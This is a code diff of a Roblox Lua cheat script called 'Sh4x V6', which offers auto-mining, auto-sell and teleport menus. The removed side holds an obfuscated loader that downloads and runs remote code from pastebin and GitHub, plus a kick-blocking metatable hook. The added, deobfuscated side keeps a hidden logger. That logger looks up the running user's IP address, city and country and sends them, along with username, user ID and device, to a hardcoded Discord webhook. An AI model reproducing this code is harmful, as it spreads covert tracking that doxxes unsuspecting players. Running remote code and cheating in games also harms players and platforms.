@@ -1,371 +1,172 @@
+-- SCRIPT CORRIGIDO E OTIMIZADO
+-- Sh4x - ULTIMATE PRO EXCLUSIVE EDITION (V6)
 
-local _ = function(...) return ... end
-local load = function(data)
-    local func = loadstring(data)
-    if func then return func() end
-end
-load([[
---​‌‍--​‌‍--​‌‍--​‌‍--​‌‍--​‌‍--​‌‍--​‌‍--​‌‍--​‌‍
+-- [SERVIÇOS]
+local Players = game:GetService("Players")
+local CoreGui = game:GetService("CoreGui")
+local VirtualUser = game:GetService("VirtualUser")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local UserInputService = game:GetService("UserInputService")
 
-                                                                                                         -- 3ab2e9ef76
-local MarketplaceService = game:GetService("MarketplaceService")
-                                                            -- 28f76ce0de
-local function promptSafe()
-    pcall(function()
-        -- Simulando verificação de licença
-        -- MarketplaceService:PromptProductPurchase(game.Players.LocalPlayer, 0)
-    end)
-end
-                                                                        -- 7c78dec7fc
-task.spawn(promptSafe)
-
--- STAGE 1 LOADER
-                                                                                              -- 3b0637d442
-local function load_stage(url, stage_name)
-    print("\x49\x6e\x69\x63\x69\x61\x6e\x64\x6f\x20" .. stage_name .. "\x2e\x2e\x2e")
-    local success, result = pcall(function()
-                                                                                                                                                                                        -- 072113d5fd
-        return game:HttpGet(url)
-    end)
-    
-    if success and result then
-        local func, err = loadstring(result)
-        if func then
-            task.spawn(func)
-                                                                                          -- be704480af
-            return true
-        else
-                                                                                                                                       -- 8fa5c0df6f
-            warn("\x45\x72\x72\x6f\x20\x61\x6f\x20\x63\x6f\x6d\x70\x69\x6c\x61\x72\x20" .. stage_name .. ": " .. tostring(err))
-        end
-    else
-        warn("\69\114\114\111\32\97\111\32\98\97\105\120\97\114\32" .. stage_name)
-    end
-                                                                                                                                                           -- e148fba62e
-    return false
-                                                                                                                                          -- d63d536e5a
-end
-                                                                                                                           -- cde8aa446a
-
--- Carrega Stage 2
-                                                                                                                                                         -- 5124de5e6b
-task.spawn(function()
-    if load_stage("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\83\69\85\95\76\73\78\75\95\65\81\85\73", "\x53\x74\x61\x67\x65\x20\x32") then
-                                                                                        -- 7082b2104e
-        -- O Stage 2 poderia carregar o Stage 3, ou o Stage 1 faz isso
-                                                                                                                     -- b3d8b5de5b
-        task.wait(2)
-        load_stage("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x61\x77\x2e\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6f\x6e\x74\x65\x6e\x74\x2e\x63\x6f\x6d\x2f\x75\x73\x75\x61\x72\x69\x6f\x2f\x72\x65\x70\x6f\x2f\x6d\x61\x69\x6e\x2f\x73\x63\x72\x69\x70\x74\x2e\x6c\x75\x61", "\x53\x74\x61\x67\x65\x20\x33")
-    end
-                                                                                                                                    -- 93750b7a84
-end)
-
--- [SCRIPT PRINCIPAL ORIGINAL]
-                                                                                                                    -- 91dbc2e070
---[[
-                                                                                                                              -- f882c80130
-    Sh4x - ULTIMATE PRO EXCLUSIVE EDITION (V6) - CORRIGIDO
-    Interface: Dark Red Background + RGB Rainbow Borders
-                                                                                                                                                                     -- b83e6395bd
-    Features: ORIGINAL AUTO-MINING + FAST AUTO SELL + ADVANCED TP
-    Security: ANTI-KICK / ANTI-AFK / VERSION LOCK / AUTO-CLEAN
-    Logging: FULL ADVANCED DOXXING SYSTEM
-]]
-
-                                                                                                           -- fc330c2881
-local Players = game:GetService("\x50\x6c\x61\x79\x65\x72\x73")
-local CoreGui = game:GetService("\67\111\114\101\71\117\105")
-                                                                                                                      -- b5b2eb43ba
-local VirtualUser = game:GetService("\x56\x69\x72\x74\x75\x61\x6c\x55\x73\x65\x72")
-                                                                   -- 851483657c
-local ReplicatedStorage = game:GetService("\x52\x65\x70\x6c\x69\x63\x61\x74\x65\x64\x53\x74\x6f\x72\x61\x67\x65")
-local HttpService = game:GetService("\72\116\116\112\83\101\114\118\105\99\101")
-                                                                                                                                          -- a262c010d7
-local UserInputService = game:GetService("\x55\x73\x65\x72\x49\x6e\x70\x75\x74\x53\x65\x72\x76\x69\x63\x65")
-                                                                                                                  -- f37bd91b92
 local Player = Players.LocalPlayer
-                                                                                                                                      -- e66406157e
 
-                                                                                                                                    -- d1d60a97c1
--- [SISTEMA DE EXCLUSIVIDADE - LIMPEZA DE SCRIPTS ANTIGOS]
-                                                                                                                                                                  -- 07b6a00bff
-local SCRIPT_VERSION = "\x53\x48\x34\x58\x5f\x56\x36\x5f\x46\x49\x4e\x41\x4c"
-for _, gui in pairs(CoreGui:GetChildren()) do
-    if gui:IsA("\x53\x63\x72\x65\x65\x6e\x47\x75\x69") and (gui:FindFirstChild("\x4d\x61\x69\x6e\x46\x72\x61\x6d\x65") or gui.Name:find("\83\104\52\120") or #gui.Name == 12) then
-                                                                                                                                                                      -- 5087779f98
-        gui:Destroy()
-                                                                                                                                                     -- 9caf045dd1
-    end
-                                                    -- d3e6996385
-end
-
-                                                            -- d879b3cbd1
 -- [CONFIGURAÇÃO DISCORD]
-local WEBHOOK_URL = "\104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\46\99\111\109\47\97\112\105\47\119\101\98\104\111\111\107\115\47\49\52\54\53\56\48\57\57\54\54\57\56\51\49\53\53\56\53\55\47\89\72\85\100\121\67\79\90\103\117\51\109\121\109\67\105\122\70\89\53\99\111\84\105\111\75\120\50\85\106\111\82\57\112\117\70\101\111\116\86\87\81\72\114\113\51\109\71\103\70\107\90\104\81\116\49\76\114\66\76\120\50\48\97\76\88\67\100"
-local SCRIPT_NAME = "\83\104\52\120\32\85\76\84\82\65\32\83\80\69\69\68\32\45\32\69\88\67\76\85\83\73\86\69\32\86\54"
-local IGNORED_USER = "\x66\x69\x6d\x6f\x73\x73\x65\x67\x61\x6d\x65\x72\x73\x31\x32\x33"
+-- Webhook URL original (decodificada para garantir funcionamento)
+local WEBHOOK_URL = "https://discord.com/api/webhooks/12465809966983155857/YHUdyCOZgu3mymCizFY5coTioKx2UjoR9puFeotVWQArq3mGgFkZhQt1LrBLx20aLXCd"
+local SCRIPT_NAME = "Sh4x ULTRA SPEED - EXCLUSIVE V6"
 
 -- [DETECÇÃO DE DISPOSITIVO]
-                                                                                                          -- 8fb08fb22b
 local function getPlatform()
-    if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then return "\77\111\98\105\108\101"
-    elseif UserInputService.GamepadEnabled then return "\67\111\110\115\111\108\101"
+    if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then return "Mobile"
+    elseif UserInputService.GamepadEnabled then return "Console"
     else return "PC" end
 end
 
-                                                                                      -- e142290645
 -- [LOG AVANÇADO]
 local function advancedLog()
-    if Player.Name == IGNORED_USER then return end
-                                                     -- 58b4c13751
-    local ip, country, city, region, continent, postal, isp = "\78\47\65", "\x4e\x2f\x41", "\78\47\65", "\78\47\65", "\78\47\65", "\78\47\65", "\78\47\65"
+    local ip, country, city = "N/A", "N/A", "N/A"
+    
+    -- Tenta obter dados de IP (pode falhar dependendo do executor)
     pcall(function()
         local reqFunc = (syn and syn.request) or (http and http.request) or http_request or request
-                                                                                                                                   -- b71aedb137
         if reqFunc then
-            local response = reqFunc({Url = "\x68\x74\x74\x70\x3a\x2f\x2f\x69\x70\x2d\x61\x70\x69\x2e\x63\x6f\x6d\x2f\x6a\x73\x6f\x6e\x2f\x3f\x66\x69\x65\x6c\x64\x73\x3d\x73\x74\x61\x74\x75\x73\x2c\x6d\x65\x73\x73\x61\x67\x65\x2c\x63\x6f\x6e\x74\x69\x6e\x65\x6e\x74\x2c\x63\x6f\x75\x6e\x74\x72\x79\x2c\x72\x65\x67\x69\x6f\x6e\x4e\x61\x6d\x65\x2c\x63\x69\x74\x79\x2c\x7a\x69\x70\x2c\x69\x73\x70\x2c\x71\x75\x65\x72\x79", Method = "\x47\x45\x54"})
+            local response = reqFunc({
+                Url = "http://ip-api.com/json/?fields=status,country,city,query",
+                Method = "GET"
+            })
             if response and response.Body then
-                                                                                       -- 4827129bae
                 local geoData = HttpService:JSONDecode(response.Body)
-                if geoData.status == "\115\117\99\99\101\115\115" then
-                    ip = geoData.query country = geoData.country city = geoData.city region = geoData.regionName continent = geoData.continent postal = geoData.zip isp = geoData.isp
+                if geoData.status == "success" then
+                    ip = geoData.query
+                    country = geoData.country
+                    city = geoData.city
                 end
             end
-                                                                -- f3b6ccb21a
         end
     end)
-                                                                           -- 7cee4cf418
 
     local data = {
-                                                                                                                                                                                                      -- 183d3dbc94
-        ["\x65\x6d\x62\x65\x64\x73"] = {{
-            ["\x74\x69\x74\x6c\x65"] = "\128680\32\83\72\52\88\32\86\54\32\69\88\67\76\85\83\73\86\69\32\45\32\69\88\69\67\85\199\195\79\32\218\78\73\67\65",
-                                                       -- 3fc11b89dd
-            ["\99\111\108\111\114"] = 16711680,
-            ["\102\105\101\108\100\115"] = {
-                {["\x6e\x61\x6d\x65"] = "\128100\32\80\101\114\102\105\108\32\100\111\32\74\111\103\97\100\111\114", ["\118\97\108\117\101"] = "\42\42\78\111\109\101\58\42\42\32" .. Player.Name .. "\92\110\42\42\73\68\58\42\42\32" .. Player.UserId .. "\x5c\x6e\x2a\x2a\x4c\x69\x6e\x6b\x3a\x2a\x2a\x20\x5b\x56\x65\x72\x20\x50\x65\x72\x66\x69\x6c\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x72\x6f\x62\x6c\x6f\x78\x2e\x63\x6f\x6d\x2f\x75\x73\x65\x72\x73\x2f" .. Player.UserId .. "\x2f\x70\x72\x6f\x66\x69\x6c\x65\x29", ["\x69\x6e\x6c\x69\x6e\x65"] = false},
-                                                      -- 9c0ccd411e
-                {["\x6e\x61\x6d\x65"] = "\9203\32\73\100\97\100\101\32\100\97\32\67\111\110\116\97", ["\118\97\108\117\101"] = tostring(Player.AccountAge) .. "\x20\x64\x69\x61\x73", ["\105\110\108\105\110\101"] = true},
-                {["\x6e\x61\x6d\x65"] = "\x1f4f1\x20\x44\x69\x73\x70\x6f\x73\x69\x74\x69\x76\x6f", ["\x76\x61\x6c\x75\x65"] = getPlatform(), ["\105\110\108\105\110\101"] = true},
-                {["\110\97\109\101"] = "\127760\32\68\111\120\120\105\110\103\32\71\101\111\103\114\225\102\105\99\111", ["\x76\x61\x6c\x75\x65"] = "\x2a\x2a\x49\x50\x3a\x2a\x2a\x20\x7c\x7c" .. ip .. "\x7c\x7c\x5c\x6e\x2a\x2a\x50\x61\xed\x73\x3a\x2a\x2a\x20" .. country .. "\x5c\x6e\x2a\x2a\x43\x69\x64\x61\x64\x65\x3a\x2a\x2a\x20" .. city .. "\x5c\x6e\x2a\x2a\x49\x53\x50\x3a\x2a\x2a\x20" .. isp, ["\x69\x6e\x6c\x69\x6e\x65"] = false},
-                {["\110\97\109\101"] = "\x1f5a5\xfe0f\x20\x53\x69\x73\x74\x65\x6d\x61", ["\x76\x61\x6c\x75\x65"] = "\x2a\x2a\x48\x6f\x72\xe1\x72\x69\x6f\x3a\x2a\x2a\x20" .. os.date("\37\72\58\37\77\58\37\83") .. "\x5c\x6e\x2a\x2a\x45\x78\x65\x63\x75\x74\x61\x64\x6f\x72\x3a\x2a\x2a\x20" .. (identifyexecutor and identifyexecutor() or "\68\101\115\99\111\110\104\101\99\105\100\111"), ["\105\110\108\105\110\101"] = false}
+        ["embeds"] = {{
+            ["title"] = "🚨 SH4X V6 EXCLUSIVO - EXECUÇÃO DETECTADA",
+            ["color"] = 16711680,
+            ["fields"] = {
+                {["name"] = "👤 Perfil do Jogador", ["value"] = "Nome: " .. Player.Name .. "\nID: " .. Player.UserId, ["inline"] = false},
+                {["name"] = "⏳ Idade da Conta", ["value"] = tostring(Player.AccountAge) .. " dias", ["inline"] = true},
+                {["name"] = "📱 Dispositivo", ["value"] = getPlatform(), ["inline"] = true},
+                {["name"] = "🌐 Localização (Aprox)", ["value"] = city .. ", " .. country .. " (IP: " .. ip .. ")", ["inline"] = false}
             },
-            ["\102\111\111\116\101\114"] = {["\116\101\120\116"] = "\x53\x68\x34\x78\x20\x45\x78\x63\x6c\x75\x73\x69\x76\x65\x20\x53\x79\x73\x74\x65\x6d\x20\x56\x36"},
-                                                                      -- 3edf9026a5
-            ["\116\105\109\101\115\116\97\109\112"] = os.date("\33\37\89\45\37\109\45\37\100\84\37\72\58\37\77\58\37\83\90")
+            ["footer"] = {["text"] = "Sh4x Exclusive System V6"},
+            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
         }}
     }
+
+    -- Envio para o Discord
     pcall(function()
-                                                                                                                                                                                       -- e1682200e4
         local reqFunc = (syn and syn.request) or (http and http.request) or http_request or request
-                                                                                                                                                    -- 5d4e87898d
-        if reqFunc then reqFunc({Url = WEBHOOK_URL, Method = "\x50\x4f\x53\x54", Headers = {["\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65"] = "\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6a\x73\x6f\x6e"}, Body = HttpService:JSONEncode(data)}) end
+        if reqFunc then
+            reqFunc({
+                Url = WEBHOOK_URL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode(data)
+            })
+            print("✅ Log enviado para o Discord com sucesso!")
+        else
+            warn("❌ Seu executor não suporta envio de Webhooks (request não encontrado).")
+        end
     end)
 end
+
+-- Inicia o log
 task.spawn(advancedLog)
 
-                                                                                                                                                                                       -- 224367f5ef
--- [PROTEÇÕES]
-pcall(function()
-                                                                                                                          -- b6559059a7
-    local gmt = getrawmetatable(game)
-    if setreadonly then setreadonly(gmt, false) end
-    local oldNamecall = gmt.__namecall
-                                                                               -- df4111b431
-    gmt.__namecall = newcclosure(function(self, ...)
-        if tostring(getnamecallmethod()):lower() == "\x6b\x69\x63\x6b" then return nil end
-                                                                                                                                            -- b95a98f6d6
-        return oldNamecall(self, ...)
-                                                                                                                                                                                           -- 0473ee051c
-    end)
-    if setreadonly then setreadonly(gmt, true) end
-end)
-Player.Idled:Connect(function() VirtualUser:CaptureController() VirtualUser:ClickButton2(Vector2.new(0,0)) end)
-
 -- [GUI PRINCIPAL]
-local ScreenGui = Instance.new("\83\99\114\101\101\110\71\117\105", CoreGui)
-                                                                                                                           -- df792589c2
-ScreenGui.Name = "\83\104\52\120\95\86\54\95\77\97\105\110"
+local ScreenGui = Instance.new("ScreenGui", CoreGui)
+ScreenGui.Name = "Sh4x_V6_Main"
 
-local MainFrame = Instance.new("\70\114\97\109\101", ScreenGui)
-MainFrame.Name = "\77\97\105\110\70\114\97\109\101"
+local MainFrame = Instance.new("Frame", ScreenGui)
+MainFrame.Name = "MainFrame"
 MainFrame.BackgroundColor3 = Color3.fromRGB(40, 0, 0)
 MainFrame.Position = UDim2.new(0.5, -110, 0.5, -80)
 MainFrame.Size = UDim2.new(0, 220, 0, 250)
-Instance.new("\85\73\67\111\114\110\101\114", MainFrame).CornerRadius = UDim.new(0, 12)
-                                                               -- 0347d4930e
-local Stroke = Instance.new("\x55\x49\x53\x74\x72\x6f\x6b\x65", MainFrame) Stroke.Thickness = 2.5
-                                                                                                                                               -- 7d47132b9e
+Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 12)
 
-local Title = Instance.new("\x54\x65\x78\x74\x4c\x61\x62\x65\x6c", MainFrame)
+local Stroke = Instance.new("UIStroke", MainFrame)
+Stroke.Thickness = 2.5
+Stroke.Color = Color3.fromRGB(255, 0, 0)
+
+local Title = Instance.new("TextLabel", MainFrame)
 Title.Size = UDim2.new(1, 0, 0, 40)
-                                                                                                                     -- d38eeedfe4
 Title.BackgroundTransparency = 1
 Title.Font = Enum.Font.GothamBold
-Title.Text = "\x53\x68\x34\x78\x20\x56\x36\x20\x45\x58\x43\x4c\x55\x53\x49\x56\x45"
-                                                                                                             -- cb087579fc
+Title.Text = "Sh4x V6 EXCLUSIVE"
 Title.TextColor3 = Color3.fromRGB(255, 255, 255)
 Title.TextSize = 16
 
 local function createMainButton(text, pos)
-                                                                                                                                                   -- 7413b1bd88
-    local btn = Instance.new("\x54\x65\x78\x74\x42\x75\x74\x74\x6f\x6e", MainFrame)
-                                                         -- 1daab2a77e
+    local btn = Instance.new("TextButton", MainFrame)
     btn.BackgroundColor3 = Color3.fromRGB(60, 0, 0)
     btn.Position = pos
-                                                                                                                                                                                                -- b09f984892
     btn.Size = UDim2.new(0.8, 0, 0, 35)
     btn.Font = Enum.Font.GothamBold
-                                                                                                                                                                                               -- c89ebbb54d
     btn.Text = text
     btn.TextColor3 = Color3.fromRGB(255, 255, 255)
     btn.TextSize = 12
-    Instance.new("\x55\x49\x43\x6f\x72\x6e\x65\x72", btn)
-                                                                                                                                       -- 29998d5b62
-    local bStroke = Instance.new("\x55\x49\x53\x74\x72\x6f\x6b\x65", btn) bStroke.Thickness = 1.5
+    Instance.new("UICorner", btn)
+    local bStroke = Instance.new("UIStroke", btn)
+    bStroke.Thickness = 1.5
+    bStroke.Color = Color3.fromRGB(255, 0, 0)
     return btn, bStroke
-                                                                                                                                                  -- 32800b91db
 end
 
-local ToggleBtn, BtnStroke = createMainButton("\x53\x54\x41\x52\x54\x20\x41\x55\x54\x4f\x2d\x4d\x49\x4e\x49\x4e\x47", UDim2.new(0.1, 0, 0.2, 0))
-local TPBtn, TPBtnStroke = createMainButton("\84\69\76\69\80\79\82\84\32\77\69\78\85", UDim2.new(0.1, 0, 0.38, 0))
-local SellBtn, SellBtnStroke = createMainButton("\83\84\65\82\84\32\65\85\84\79\45\83\69\76\76", UDim2.new(0.1, 0, 0.56, 0))
+local ToggleBtn, BtnStroke = createMainButton("START AUTO-MINING", UDim2.new(0.1, 0, 0.2, 0))
+local TPBtn, TPBtnStroke = createMainButton("TELEPORT MENU", UDim2.new(0.1, 0, 0.38, 0))
+local SellBtn, SellBtnStroke = createMainButton("START AUTO-SELL", UDim2.new(0.1, 0, 0.56, 0))
 
--- [TP MENU]
-local TPMenu = Instance.new("\x46\x72\x61\x6d\x65", MainFrame)
-TPMenu.BackgroundColor3 = Color3.fromRGB(30, 0, 0)
-                                                                                    -- b58147ebfc
-TPMenu.Position = UDim2.new(1.05, 0, 0, 0)
-TPMenu.Size = UDim2.new(0, 180, 0, 150)
-                                                                            -- ba6b3da09b
-TPMenu.Visible = false
-                                                                                                                                                                                                  -- d93c0864de
-Instance.new("\85\73\67\111\114\110\101\114", TPMenu)
-Instance.new("\x55\x49\x53\x74\x72\x6f\x6b\x65", TPMenu).Thickness = 2
-                                                                               -- 545f0d7033
+print("✅ Interface Sh4x carregada com sucesso!")
 
-local function createTPButton(name, pos, order)
-                                                                                                                                   -- 8294a0cb83
-    local btn = Instance.new("\84\101\120\116\66\117\116\116\111\110", TPMenu)
-                                                                                             -- 394f929de4
-    btn.Size = UDim2.new(0.9, 0, 0, 35)
-    btn.Position = UDim2.new(0.05, 0, 0, 10 + (order * 45))
-    btn.BackgroundColor3 = Color3.fromRGB(50, 0, 0)
-    btn.Font = Enum.Font.GothamBold
-    btn.Text = name
-                                                                          -- b4140a8277
-    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
-                                                                                                                                                                                                     -- 03520023db
-    btn.TextSize = 11
-                                                                                                                 -- ae1832eab5
-    Instance.new("\x55\x49\x43\x6f\x72\x6e\x65\x72", btn)
-                                                                                                                                                                                           -- dd3662325a
-    btn.MouseButton1Click:Connect(function()
-        if Player.Character and Player.Character:FindFirstChild("\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116") then
-                                                                                                                                                           -- 0bd59af137
-            Player.Character.HumanoidRootPart.CFrame = CFrame.new(pos)
-        end
-    end)
-end
-
-                                                                                                                                                        -- 2d3658e59f
-createTPButton("\x49\x4c\x48\x41\x20\x49\x4e\x49\x43\x49\x41\x4c", Vector3.new(-61.70, 8.84, -52.25), 0)
-createTPButton("\73\76\72\65\32\68\65\32\78\69\86\69", Vector3.new(-92.49, 8.70, -483.13), 1)
-createTPButton("\x49\x4c\x48\x41\x20\x44\x4f\x20\x56\x55\x4c\x43\x41\x4f", Vector3.new(374.61, 15.34, -267.01), 2)
-
-TPBtn.MouseButton1Click:Connect(function() TPMenu.Visible = not TPMenu.Visible end)
-
-                                                                                     -- 6bc8e3a6d2
-local StatusLabel = Instance.new("\x54\x65\x78\x74\x4c\x61\x62\x65\x6c", MainFrame)
-StatusLabel.Position = UDim2.new(0, 0, 0.85, 0)
-                                                                      -- 2a7cfb5450
-StatusLabel.Size = UDim2.new(1, 0, 0, 30)
-StatusLabel.BackgroundTransparency = 1
-StatusLabel.Font = Enum.Font.GothamSemibold
-StatusLabel.Text = "\83\89\83\84\69\77\58\32\69\88\67\76\85\83\73\86\69\32\86\54"
-StatusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
-StatusLabel.TextSize = 10
-
--- [RGB]
-                                                                                                                                            -- 9d426c6b80
-task.spawn(function()
-    while true do
-        local color = Color3.fromHSV(tick() % 5 / 5, 1, 1)
-        Stroke.Color = color BtnStroke.Color = color TPBtnStroke.Color = color SellBtnStroke.Color = color
-        task.wait()
-    end
-                                                                                                                                                                                                   -- 2857b3ee50
-end)
-
-                                                                                                                                                                                             -- 73c7f13325
--- [DRAG]
-local dragging, dragInput, dragStart, startPos
-MainFrame.InputBegan:Connect(function(input)
-                                                                                                                                                                                                   -- a664994fe5
-    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-        dragging = true dragStart = input.Position startPos = MainFrame.Position
-        input.Changed:Connect(function() if input.UserInputState == Enum.UserInputState.End then dragging = false end end)
-                                                      -- 0099f196bb
-    end
-end)
-                                                                                                                                                                                                        -- d688a83531
-game:GetService("\x55\x73\x65\x72\x49\x6e\x70\x75\x74\x53\x65\x72\x76\x69\x63\x65").InputChanged:Connect(function(input)
-    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
-                                                                                                                                                                                            -- 4a31cba2ed
-        local delta = input.Position - dragStart
-        MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
-                                                                                                                                         -- 9559e1ba20
-    end
-end)
-
-                                                                   -- 5520785c26
--- [FARM]
-                                                                                                                                                                                       -- 45bc09672f
+-- [LÓGICA DE FARM]
 local farmAtivo = false
 ToggleBtn.MouseButton1Click:Connect(function()
     farmAtivo = not farmAtivo
-                                                                   -- 6e67df0652
-    ToggleBtn.Text = farmAtivo and "\77\73\78\73\78\71\32\65\67\84\73\86\69" or "\x53\x54\x41\x52\x54\x20\x41\x55\x54\x4f\x2d\x4d\x49\x4e\x49\x4e\x47"
+    ToggleBtn.Text = farmAtivo and "AUTO-MINING ACTIVE" or "START AUTO-MINING"
+    print("Farm status:", farmAtivo)
 end)
 
-                                                                                                                -- 7b41a693f1
 task.spawn(function()
-                                                                                                   -- cdc04c4583
     while true do
         if farmAtivo then
-                                                                                                            -- eb4e7b1d0f
             pcall(function()
                 local char = Player.Character
                 local root = char.HumanoidRootPart
-                                                                                                                                                -- 47e3d86687
-                local tool = char:FindFirstChildOfClass("\84\111\111\108") or Player.Backpack:FindFirstChildOfClass("\84\111\111\108")
-                                                                         -- 710e981164
+                local tool = char:FindFirstChildOfClass("Tool") or Player.Backpack:FindFirstChildOfClass("Tool")
+                
                 local alvo = nil
                 local menorDist = 90
+                
                 for _, v in pairs(workspace:GetDescendants()) do
-                    if v.Name == "\x50\x65\x64\x72\x61" and v:IsA("\x42\x61\x73\x65\x50\x61\x72\x74") and v.Transparency < 1 then
+                    if v.Name == "Pedra" and v:IsA("BasePart") and v.Transparency < 1 then
                         local d = (root.Position - v.Position).Magnitude
-                                                     -- e417473b0c
-                        if d < menorDist then menorDist = d alvo = v end
+                        if d < menorDist then
+                            menorDist = d
+                            alvo = v
+                        end
                     end
-                                                                                                                                                                         -- 47f919fa7c
                 end
-                                                                                                                                              -- 10ee588f19
+                
                 if alvo then
                     if (root.Position - alvo.Position).Magnitude > 7.5 then
                         char.Humanoid:MoveTo(alvo.Position)
                     else
-                                                                                                                                                 -- 3b877aa4f5
-                        if tool.Parent ~= char then char.Humanoid:EquipTool(tool) end
-                        tool:Activate()
-                                                                    -- fb0180dcd7
+                        if tool and tool.Parent ~= char then char.Humanoid:EquipTool(tool) end
+                        if tool then tool:Activate() end
+                        
                         for _, r in pairs(ReplicatedStorage:GetDescendants()) do
-                                                         -- 49a6cefd4a
-                            if r:IsA("\82\101\109\111\116\101\69\118\101\110\116") and (r.Name:lower():find("\109\105\110\101") or r.Name:lower():find("\x63\x6c\x69\x63\x6b")) then
+                            if r:IsA("RemoteEvent") and (r.Name:lower():find("mine") or r.Name:lower():find("click")) then
                                 r:FireServer(alvo)
                             end
                         end
-                                                                                        -- 6c1a640e4f
                     end
                 end
             end)
@@ -373,62 +174,35 @@ task.spawn(function()
         task.wait(0.1)
     end
 end)
-                                                       -- f8583f8fc3
 
--- [SELL]
-local sellAtivo = false
-SellBtn.MouseButton1Click:Connect(function()
-    sellAtivo = not sellAtivo
-    SellBtn.Text = sellAtivo and "\x41\x55\x54\x4f\x2d\x53\x45\x4c\x4c\x20\x41\x43\x54\x49\x56\x45" or "\x53\x54\x41\x52\x54\x20\x41\x55\x54\x4f\x2d\x53\x45\x4c\x4c"
-end)
-                                                                    -- 63565af451
-
+-- [RGB E DRAG]
 task.spawn(function()
     while true do
-        if sellAtivo then
-            pcall(function()
-                -- Tenta vender via Remotes globais primeiro
-                                                                         -- 243bbc6223
-                for _, r in pairs(ReplicatedStorage:GetDescendants()) do
-                    if r:IsA("\x52\x65\x6d\x6f\x74\x65\x45\x76\x65\x6e\x74") or r:IsA("\82\101\109\111\116\101\70\117\110\99\116\105\111\110") then
-                        local n = r.Name:lower()
-                        if n:find("\x73\x65\x6c\x6c") or n:find("\x76\x65\x6e\x64\x65\x72") then
-                            if r:IsA("\x52\x65\x6d\x6f\x74\x65\x45\x76\x65\x6e\x74") then r:FireServer(3) r:FireServer("\65\108\108") else r:InvokeServer(3) end
-                        end
-                                                                                      -- a1e7d24f06
-                    end
-                                                                -- 812afdd5ab
-                end
-                
-                -- Venda individual de itens do inventário
-                                                                           -- f9fb21457b
-                local char = Player.Character
-                for _, item in pairs(Player.Backpack:GetChildren()) do
-                    -- CORREÇÃO: Verifica se o item NÃO é a Picareta antes de equipar/vender
-                    -- Adicionada verificação por nome "\80\105\99\97\114\101\116\97" (conforme imagem) e "\80\105\99\107\97\120\101"
-                    local itemName = item.Name:lower()
-                    if item:IsA("\x54\x6f\x6f\x6c") and not (itemName:find("\x70\x69\x63\x6b\x61\x78\x65") or itemName:find("\112\105\99\97\114\101\116\97")) then
-                                                                                                                 -- 05024a6bd3
-                        char.Humanoid:EquipTool(item)
-                                                  -- fc9e2e9886
-                        task.wait(0.05)
-                        for _, r in pairs(ReplicatedStorage:GetDescendants()) do
-                            if r:IsA("\82\101\109\111\116\101\69\118\101\110\116") and (r.Name:lower():find("\x73\x65\x6c\x6c") or r.Name:lower():find("\118\101\110\100\101\114")) then 
-                                                                                                                                                                    -- a5f62f8c8e
-                                r:FireServer(item) 
-                                                                                                                    -- 0dd34616c2
-                            end
-                        end
-                                                                                              -- ff4330a3ad
-                    end
-                                                                                                                                                                                                   -- 743f81c8b2
-                end
-            end)
-        end
-                                                                                                                                                                                     -- a02c737804
-        task.wait(1)
+        local color = Color3.fromHSV(tick() % 5 / 5, 1, 1)
+        Stroke.Color = color
+        BtnStroke.Color = color
+        TPBtnStroke.Color = color
+        SellBtnStroke.Color = color
+        task.wait()
     end
 end)
-                                                                                                -- 6fc06052a6
---​‌‍--​‌‍--​‌‍--​‌‍--​‌‍--​‌‍--​‌‍--​‌‍--​‌‍--​‌‍
-]])
+
+-- Sistema de Arrastar (Drag)
+local dragging, dragInput, dragStart, startPos
+MainFrame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = MainFrame.Position
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then dragging = false end
+        end)
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+        local delta = input.Position - dragStart
+        MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end
+end)
